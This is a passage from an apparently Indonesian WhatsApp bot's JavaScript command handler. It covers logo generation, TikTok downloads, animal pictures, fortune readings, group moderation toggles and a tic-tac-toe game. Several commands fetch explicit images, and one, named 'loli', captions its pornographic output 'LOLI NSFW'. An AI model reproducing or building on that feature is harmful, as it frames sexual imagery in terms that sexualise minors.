if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy|Wandy`)
const [text1, text2] = text.split`|`
if (!text2) return m.reply(`Example: ${prefix + command} Wandy|Wandy`)
image = await new canva.Gfx3()
    .setText1(text1)
    .setText2(text2)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'logo4':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy|Wandy`)
const [text3, text4] = text.split`|`
if (!text4) return m.reply(`Example: ${prefix + command} Wandy|Wandy`)
image = await new canva.Gfx4()
    .setText1(text3)
    .setText2(text4)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'logo5':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
image = await new canva.Gfx5()
    .setText(text)
    .toAttachment();
    m.reply(mess.wait)
  data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: '_Done_'}, { quoted: m })
break
case 'tiktok':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} https://www.tiktok.com/t/ZS8sU7nmb/`)
try {
t = await tiktok(text)
m.reply(mess.wait)
stats = t.stats;
vid = t.video;
ttan = `⭔Title: ${t.title}
⭔Upload: ${t.created_at}
⭔Like: ${stats.likeCount}
⭔Comment: ${stats.commentCount}
⭔Share: ${stats.shareCount}
⭔Play: ${stats.playCount}
⭔Save: ${stats.saveCount}
⭔Duration: ${vid.durationFormatted}`
conn.sendMessage(m.chat, { image: { url: vid.cover }, caption: ttan }, { quoted: m })
await conn.sendMessage(m.chat, { video: { url: vid.noWatermark }, caption: '' }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'qrcode':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wanday`)
m.reply(mess.wait)
qr = await qrcode.toBuffer(text)
conn.sendMessage(m.chat, { image: qr,  caption: `Berhasil membuat qr dari: ${text}`}, { quoted: m })
break
case 'bird': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/bird')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'cat': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/cat')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'dog': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/dog')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'fox': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/fox')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'kangaroo': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/kangaroo')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'koala': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/koala')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'panda': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/panda')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'raccoon': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/raccoon')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'redpanda': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
resultan = await fetchJson('https://some-random-api.ml/animal/red_panda')
conn.sendMessage(m.chat, { image: { url: resultan.image }, caption: resultan.fact }, { quoted: m })
}
break
case 'jadianpernikahan': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 6,12,2020`)
let [tgl, bln, thn] = text.split`,`
anuk = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anuk.status == false) return m.reply(anuk.message)
m.reply(`⭔ *Tanggal Pernikahan :* ${anuk.message.tanggal}\n⭔ *karakteristik :* ${anuk.message.karakteristik}`)
}
break
case 'kecocokanpasangan': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy|gaada`)
let [nama1, nama2] = text.split`|`
anuk = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anuk.status == false) return m.reply(anuk.message)
conn.sendMessage(m.chat, { image: { url: anuk.message.gambar }, caption: `⭔ *Nama Anda :* ${anuk.message.nama_anda}\n⭔ *Nama Pasangan :* ${anuk.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anuk.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anuk.message.sisi_negatif}` }, { quoted: m })
}
break
case 'kecocokannama': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
anuk = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anuk.status == false) return m.reply(anuk.message)
m.reply(`⭔ *Nama :* ${anuk.message.nama}\n⭔ *Lahir :* ${anuk.message.tgl_lahir}\n⭔ *Life Path :* ${anuk.message.life_path}\n⭔ *Destiny :* ${anuk.message.destiny}\n⭔ *Destiny Desire :* ${anuk.message.destiny_desire}\n⭔ *Personality :* ${anuk.message.personality}\n⭔ *Persentase :* ${anuk.message.persentase_kecocokan}`)
}
break
case 'firework':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} wandy`)
m.reply(mess.wait)
textpro = await maker("https://textpro.me/firework-sparkle-text-effect-930.html", text)
conn.sendMessage(m.chat, { image: { url: textpro }, caption: "" }, { quoted: m })
break
case 'neku':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
m.reply(mess.wait)
hasilnya = await fetchJson(`https://nekos.life/api/v2/img/neko`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*NEKU ANIME*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'shinobu': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
m.reply(mess.wait)
hasilnya = await fetchJson(`https://api.waifu.pics/sfw/shinobu`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*SHINOBU ANIME*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
}
break
case 'megumin': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
m.reply(mess.wait)
hasilnya = await fetchJson(`https://api.waifu.pics/sfw/megumin`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*MEGUMIN ANIME*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
}
break
case 'waifu':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
try {
hasilnya = await fetchJson(`https://nekos.life/api/v2/img/waifu`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*WAIFU ANIME*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'nsfw': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].nsfw) return m.reply(`Nsfw sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].nsfw = true
                m.reply(`Nsfw sukses di aktifkan!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].nsfw) return m.reply(`Nsfw sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].nsfw = false
                m.reply(`Nsfw sukses di matikan!`)
                } else {
                 m.reply(`Example: ${prefix + command} on/off`)
                 }
                 }
             break
case 'simi': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].simi) return m.reply(`Simi sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].simi = true
                m.reply(`Simi sukses di aktifkan!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].simi) return m.reply(`Simi sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].simi = false
                m.reply(`Simi sukses di matikan!`)
                } else {
                 m.reply(`Example: ${prefix + command} on/off`)
                 }
                 }
             break
case 'antitoxic': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antitoxic) return m.reply(`Antitoxic sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antitoxic = true
                m.reply(`Antitoxic sukses di aktifkan!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antitoxic) return m.reply(`Antitoxic sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antitoxic = false
                m.reply(`Antitoxic sukses di matikan!`)
                } else {
                 m.reply(`Example: ${prefix + command} on/off`)
                 }
                 }
             break
case 'antiviewonce': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antiviewonce) return m.reply(`Antiviewonce sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antiviewonce = true
                m.reply(`Antiviewonce sukses di aktifkan!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antiviewonce) return m.reply(`Antiviewonce sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antiviewonce = false
                m.reply(`Antiviewonce sukses di matikan!`)
                } else {
                 m.reply(`Example: ${prefix + command} on/off`)
                 }
                 }
             break
case 'antilink': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Antilink sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink sukses di aktifkan!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Antilink sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink sukses di matikan!`)
                } else {
                 m.reply(`Example: ${prefix + command} on/off`)
                 }
                 }
             break
case 'loli':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
try {
hasilnya = await fetchJson(`https://api.waifu.pics/nsfw/waifu`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*LOLI NSFW*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'ahegao': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/ahegao.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*AHEGAO NSFW*` }, { quoted: m })
}
break
case 'foot': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/foot.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*FOOT NSFW*` }, { quoted: m })
}
break
case 'femdom': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/femdom.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*FEMDOM NSFW*` }, { quoted: m })
}
break
case 'ero': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/ero.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*ERO NSFW*` }, { quoted: m })
}
break
case 'elves': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/elves.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*ELVES NSFW*` }, { quoted: m })
}
break
case 'cum': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/cum.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*CUM NSFW*` }, { quoted: m })
}
break
case 'cuckold': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/cuckold.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*CUCKOLD NSFW*` }, { quoted: m })
}
break
case 'creampie': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/creampie.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*CREAMPIE NSFW*` }, { quoted: m })
}
break
case 'ass': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/ass.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*ASS NSFW*` }, { quoted: m })
}
break
case 'boobjob': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/boobjob.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*BOOBJOB NSFW*` }, { quoted: m })
}
break
case 'blowjob': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/blowjob.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*BLOWJOB NSFW*` }, { quoted: m })
}
break
case 'bdsm': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
let hehe = await fetchJson('https://raw.githubusercontent.com/Wandygans/raw/main/bdsm.json')
let ini = await pickRandom(hehe)
conn.sendMessage(m.chat, { image: { url: ini }, caption: `*BDSM NSFW*` }, { quoted: m })
}
break
case 'trap':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
try {
hasilnya = await fetchJson(`https://api.waifu.pics/nsfw/trap`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*TRAP NSFW*` }, { quoted: m })
} catch (e) {
m.reply(`Error, ulangi fitur atau lapor owner!`)
}
break
case 'neko':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
if (!db.data.chats[m.chat].nsfw) return m.reply(mess.nsfw)
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
try {
hasilnya = await fetchJson(`https://api.waifu.pics/nsfw/neko`)
conn.sendMessage(m.chat, { image: { url: hasilnya.url }, caption: `*NEKO NSFW*` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'katabucin':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
katakata = await fetchJson('https://raw.githubusercontent.com/Wandygans/database/main/katabucin.json')
hata = await pickRandom(katakata)
m.reply(`${hata.result}\n\n*By: WandyGans*`)
break
case 'quotesanime':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
data = await quotesAnime()
datanya = await pickRandom(data)
hasilnya = `*Quote* : ${datanya.quotes}\n\n*By ${datanya.karakter}*`
m.reply(hasilnya)
break
case 'katabijak':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
hasilnya = await katabijak()
result = await pickRandom(hasilnya)
katabi = `Quotes : ${result.quotes}\n\n*By : ${result.author.name}*`
m.reply(katabi)
break
case 'ramalanpekerjaan':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 7,7,2005`)
m.reply(mess.wait)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`)
break
case 'liriklagu':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} melukis senja`)
try {
hasil = await bocil.lyricsv2(text)
has = `⭔Title: ${hasil.title}\n⭔Author: ${hasil.author}\n\n${hasil.lyrics}`
m.reply(has)
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'tictactoe': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!m.isGroup) return m.reply(mess.group)
            let TicTacToe = require("./lib/tictactoe")
            conn.game = conn.game ? conn.game : {}
            if (Object.values(conn.game).find(room => room.id.includes('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`Sesi di temukan, kamu masi terdeteksi di dalam permainan sebelumnya, untuk memulai permainan baru ketik *.delttt*`)
            let room = Object.values(conn.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Permainan ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]} untuk jalan

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
